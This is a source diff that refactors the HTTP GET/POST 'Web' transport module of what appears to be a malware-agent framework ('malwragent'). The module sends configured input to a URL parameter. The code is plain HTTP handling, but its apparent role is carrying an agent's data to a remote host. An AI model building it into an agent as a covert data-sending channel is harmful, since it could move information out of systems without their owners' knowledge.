@@ -5,6 +5,8 @@ from __future__ import absolute_import
 import requests
 import validators
 
+from urlparse import urlparse
+from urlparse import parse_qsl  # return data as a list of name, value pairs
 from cStringIO import StringIO
 
 from malwragent.packages.helpers.agentmodule import AgentModule
@@ -24,56 +26,64 @@ class Web(AgentModule):
     """provide basic transportation routines"""
 
     @staticmethod
-    def __do_get(url, data):
-        """process url,data and make HTTP GET request"""
-        # TODO[25/10/2016][bl4ckw0rm] do this better
-        # TODO[30/10/2016][bl4ckw0rm] validate URI for its domain, path and parameter
-        if data is not None:
-            uri = '%s%s' % (url, data)
-        else:
-            uri = '%s' % url
-
-        req = requests.get(uri)
-        # print req.status_code
-        if req.status_code == 200:
-            if req.text:
-                return req.text
-            else:
-                return True  # req.text
-        else:
-            return False  # think about returning the req.status_code
+    def __parse_url(url):
+        """return urlparsed url"""
+        return urlparse(url, allow_fragments=False)
 
     @staticmethod
-    def __do_post(url, data):
-        """process url,data and make HTTP POST request"""
-        payload = {
-            'param': data
-        }
+    def __get_parameter_from_parsed_url(parsed_url):
+        """return target argument"""
+        params = dict(parse_qsl(parsed_url.query, keep_blank_values=True))
+        return params.keys()[0] if 0 < len(params.keys()) else None  # return the first argument only
 
-        req = requests.post(url, payload)
-        # print req.status_code
-        if req.status_code == 200:
-            if req.text:
-                return req.text
+    @staticmethod
+    def __get_host_from_parsed_url(parsed_url):
+        """return http(s) hostname"""
+        return parsed_url.scheme + '://' + parsed_url.netloc
+
+    @staticmethod
+    def __validate_request_status(request):
+        """validate a http request's response"""
+        if request.status_code == 200:
+            if request.text:
+                return request.text
             else:
                 return True  # req.text
         else:
             return False  # think about returning the req.status_code
 
+    def __do_http_request(self, type, url, data):
+        """makes http get and post requests"""
+        parsed_url = self.__parse_url(url)
+        parameter = self.__get_parameter_from_parsed_url(parsed_url)
+        hostname = self.__get_host_from_parsed_url(parsed_url)
+        url = hostname + parsed_url.path  # url is overwritten
+        payload = {
+            parameter: data
+        }
+
+        if type == 'GET':
+            request = requests.get(url, payload)
+        else:
+            request = requests.post(url, payload)
+
+        return self.__validate_request_status(request)
+
+    # how to ignore output ??
     @Decorators.args([('url', _FORMAT.URL)])
     @Decorators.config(run_first=True)
     def f_http_get(self, url):
-        """send HTTP GET request"""
+        """send http get request"""
         input_ = self.settings['input']
-        output = self.__do_get(url, input_)
+        output = self.__do_http_request('GET', url, input_)
         return output
 
-    @Decorators.args([('url', _FORMAT.URL), 'parameter'])
+    @Decorators.args([('url', _FORMAT.URL)])
     @Decorators.config(run_first=True)
     def f_http_post(self, url):  # ask for two args, current only one supported
-        """send HTTP POST request"""
+        """send http post request"""
         input_ = self.settings['input']
-        output = self.__do_post(url, input_)
+        output = self.__do_http_request('POST', url, input_)
         return output
 
     @staticmethod
